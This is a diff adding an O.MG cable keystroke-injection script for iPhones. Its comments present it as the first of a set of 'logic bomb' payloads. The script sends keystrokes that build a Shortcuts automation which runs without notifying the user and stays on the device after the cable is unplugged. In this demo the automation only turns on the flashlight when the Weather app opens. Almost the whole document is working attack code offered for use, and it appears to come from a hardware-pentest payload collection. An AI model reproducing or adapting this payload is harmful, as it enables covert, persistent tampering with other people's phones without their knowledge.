@@ -1,0 +1,54 @@
+REM Version 1.0
+REM OS: iOS
+REM Author: Peaakss
+REM Description: This is the first of the iOS 2.0 Payloads, this payload will go and create a shortcut that runs automatically without notifying the user, iOS 2.0 allows for logic bomb like capabilities, using shortcuts you can choose when and how your logic bomb is activated, this is the first example of 2.0 payloads. This payload will turn on the flashlight on the device when the weather app is opened, and is still persistent after being unplugged! Have fun and be safe and ethical!
+REM NOITCE Payload was made on iOS 16.3 - iPhone | Timing may have have to be changed based on version/model
+REM NOTICE Lighting to USB-A or USB-C camera adapter is needed to run this payload, active end of the O.MG cable must be plugged into the end of the adapter
+REM NOTICE This Payload requires full keyboard access to be turned on before payload is ran
+REM [I wanna thank Kalani and the OMG team for assistance on this payload and the payloads to come, and for all the help and inspiration they have given me :D]
+
+DEFAULT_DELAY 2500
+
+GUI h
+GUI h
+GUI SPACE
+STRING Shortcuts
+SPACE
+REPEAT 8 TAB
+RIGHTARROW
+SPACE
+SPACE
+REPEAT 13 DOWNARROW
+SPACE
+DOWNARROW
+SPACE
+UPARROW
+SPACE
+STRING Weather
+ENTER
+DOWNARROW
+SPACE
+REPEAT 2 TAB
+UPARROW
+SPACE
+REPEAT 2 TAB
+REPEAT 2 RIGHTARROW
+SPACE
+REM Acations
+SPACE
+REPEAT 2 TAB
+REPEAT 5 DOWNARROW
+SPACE
+TAB
+REPEAT 2 RIGHTARROW
+SPACE
+UPARROW
+SPACE
+REPEAT 5 DOWNARROW
+REPEAT 15 DOWNARROW
+SPACE
+TAB
+DOWNARROW
+RIGHTARROW
+SPACE
+GUI h
